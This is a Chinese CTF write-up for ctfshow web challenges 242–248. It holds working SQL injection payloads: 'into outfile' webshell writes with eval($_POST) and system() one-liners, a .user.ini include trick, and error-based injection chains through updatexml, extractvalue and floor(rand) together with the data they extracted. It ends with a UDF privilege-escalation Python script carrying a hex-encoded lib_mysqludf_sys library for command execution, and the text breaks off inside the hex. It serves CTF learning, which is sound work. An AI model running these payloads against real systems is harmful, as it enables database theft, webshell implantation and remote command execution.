<h2 id="file模块"><a href="#file模块" class="headerlink" title="file模块"></a>file模块</h2><h3 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//备份表</span><br><span class="line">  $sql = &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>写入文件，路由是&#x2F;api&#x2F;dump.php</p>
<p>用<code>lines terminated by </code>或者<code>lines starting by </code>或者<code>fields terminated by </code>写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;#</span><br><span class="line">filename=1.php&#x27; lines starting by &#x27;&lt;?php phpinfo();?&gt;&#x27;;#</span><br><span class="line">filename=1.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;#</span><br></pre></td></tr></table></figure>

<p>然后写🐎访问&#x2F;dump&#x2F;shell.php就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;cat /flag.here&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//过滤了php</span><br></pre></td></tr></table></figure>

<p>跟文件上传一样打</p>
<p>看一下中间件nginx&#x2F;1.20.1</p>
<p>先传一个1.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.txt&#x27; lines terminated by &#x27;&lt;?= eval($_POST[1]); ?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<p>传<code>.user.ini</code>文件</p>
<p>然后访问&#x2F;dump并RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>

<p>因为<code>.user.ini文件</code>会将1.txt包含道服务器默认的php文件中例如index.php，并且我们访问&#x2F;dump的话也是会自动导向默认的php文件，所以直接访问&#x2F;dump就行</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h3><p>报错注入开始，可以用<code>updatexml\extractvalue</code>打xpath报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//备份表</span><br><span class="line">  $sql = &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">回显~ctfshow_web~</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br><span class="line">回显~banlist,ctfshow_flag,ctfshow_us</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),0x7e),1)--+</span><br><span class="line">回显~id,flag,info~</span><br></pre></td></tr></table></figure>

<p>后面发现无法全部显示，换成left和right去分别输出吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x7e,left((select flag from ctfshow_flag),30),0x7e),1)--+</span><br><span class="line">~ctfshow&#123;ee4ca922-a90b-4041-bf5~</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x7e,right((select flag from ctfshow_flag),30),0x7e),1)--+</span><br><span class="line">~2-a90b-4041-bf53-f5a23fa9d0a6&#125;~</span><br></pre></td></tr></table></figure>

<p>拼接后就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;ee4ca922-a90b-4041-bf53-f5a23fa9d0a6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h3><p>过滤<code>updatexml</code>那就用另一个<code>extractvalue</code>呗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,(select version())))--+</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~10.3.18-MariaDB</span><br></pre></td></tr></table></figure>

<p>那直接打就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,(select database())))--+</span><br><span class="line">回显~ctfshow_web</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))--+</span><br><span class="line">回显~banlist,ctfshow_flagsa,ctfshow_</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;)))--+</span><br><span class="line">回显~id,flag1,info</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,left((select flag1 from ctfshow_flagsa),30)))--+</span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,right((select flag1 from ctfshow_flagsa),30)))--+</span><br></pre></td></tr></table></figure>

<h3 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤updatexml extractvalue</span><br></pre></td></tr></table></figure>

<p>xpath报错走不了了，用group by 报错注入</p>
<p>floor(rand(0)<em>2) 产生的随机数的*<em>前六位</em></em> 一定是 “011011”</p>
<p>然后我们的payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select count(*),2,concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a--+</span><br><span class="line">回显ctfshow_web~1</span><br></pre></td></tr></table></figure>

<p>后面一直没成功，我以为是概率问题，结果发现是有限制输出长度</p>
<p>用切片函数去分段输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(left((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27;),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(left((select flag2 from ctfshow_flags),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(right((select flag2 from ctfshow_flags),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<h3 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤updatexml extractvalue floor</span><br></pre></td></tr></table></figure>

<p>说明上面的是预期解，我们继续用别的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ceil()-向上取整函数</span><br><span class="line">ceil(x) 返回不小于 x 的最小整数，即向上取整。</span><br><span class="line">例如，ceil(3.14) 返回 4。</span><br><span class="line"></span><br><span class="line">round() - 四舍五入函数</span><br><span class="line">round(x) 返回最接近 x 的整数，如果有两个整数与 x 距离相等，则返回偶数的整数。</span><br><span class="line">例如，round(3.6) 返回 4，round(3.5) 返回 4，round(3.4) 返回 3。</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select count(*),2,concat((select database()),0x7e,round(rand(0)*2))as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select count(*),2,concat((select database()),0x7e,ceil(rand(0)*2))as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">回显ctfshow_web~1</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x7e,left((select group_concat(table_name)from information_schema.tables where table_schema=database()),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x7e,left((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<p>这里有一个需要注意的地方，因为爆出来的字段名是<code>flag?</code>，所以需要用反引号去括起来否则会造成解析错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x7e,left((select `flag?` from ctfshow_flagsa),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(0x7e,right((select `flag?` from ctfshow_flagsa),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<h2 id="UDF注入"><a href="#UDF注入" class="headerlink" title="UDF注入"></a>UDF注入</h2><h3 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h3><p>UDF提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>参考师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考脚本</span></span><br><span class="line"><span class="comment"># 环境：Linux/MariaDB</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e0755bce-8366-435e-ae6d-acd10ff77c81.challenge.ctf.show/api/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000